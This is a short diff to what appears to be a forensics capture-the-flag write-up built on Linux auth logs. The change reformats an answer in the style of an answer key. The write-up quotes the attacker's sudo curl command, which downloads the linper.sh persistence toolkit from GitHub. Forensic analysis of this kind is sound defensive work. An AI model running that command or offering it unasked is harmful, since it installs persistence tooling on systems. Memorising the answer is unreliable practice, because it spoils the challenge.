@@ -150,4 +150,4 @@ Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberj
 ```
 From these logs, the command executed by the attacker to download the script using sudo is `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`, which is part of the Linux persistence toolkit.
 
-**Answer**: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+**Answer**: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
